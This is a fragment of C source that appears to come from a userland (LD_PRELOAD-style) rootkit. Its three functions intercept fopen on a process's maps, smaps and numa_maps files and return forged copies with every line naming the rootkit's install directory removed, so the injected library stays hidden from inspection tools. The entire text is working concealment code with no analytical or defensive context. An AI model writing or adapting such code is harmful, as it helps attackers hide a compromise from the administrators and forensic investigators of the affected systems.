FILE *forge_maps(const char *pathname)
{
    FILE *o = tmpfile(), *pnt;
    char buf[PATH_MAX];

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
        if(!xstrstr(INSTALL_DIR, buf))
            (void)fputs(buf, o);

    (void)fclose(pnt);
    (void)fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_smaps(const char *pathname)
{
    FILE *o = tmpfile(), *pnt;
    char buf[PATH_MAX];
    int i = 0;

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL){
        if(i > 0) i++;
        if(i > 15) i = 0;
        if(xstrstr(INSTALL_DIR, buf)) i = 1;
        if(i == 0) (void)fputs(buf,o);
    }

    (void)fclose(pnt);
    (void)fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_numamaps(const char *pathname)
{
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX],
         addr[128],
         type[64],
         location[PATH_MAX];

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
        errno = ENOENT;
        return NULL; }

    while(fgets(buf, sizeof(buf), pnt) != NULL){
        (void)sscanf(buf, "%s %s %s", addr, type, location);
        if(!xstrstr(INSTALL_DIR, location)) (void)fputs(buf,o);
    }

    (void)fclose(pnt);
    (void)fseek(o, 0, SEEK_SET);
    return o;
}
